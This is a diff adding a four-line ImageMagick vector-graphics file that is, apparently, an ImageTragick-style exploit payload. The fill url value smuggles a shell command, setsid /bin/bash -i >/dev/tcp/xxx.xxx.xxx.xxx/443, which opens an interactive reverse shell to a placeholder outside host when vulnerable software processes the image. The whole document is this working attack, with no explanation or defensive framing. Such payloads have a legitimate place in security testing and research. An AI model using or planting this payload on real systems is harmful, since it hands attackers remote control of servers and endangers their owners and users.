@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|setsid /bin/bash -i >/dev/tcp/xxx.xxx.xxx.xxx/443 0<&1 2>&1")'
+pop graphic-context
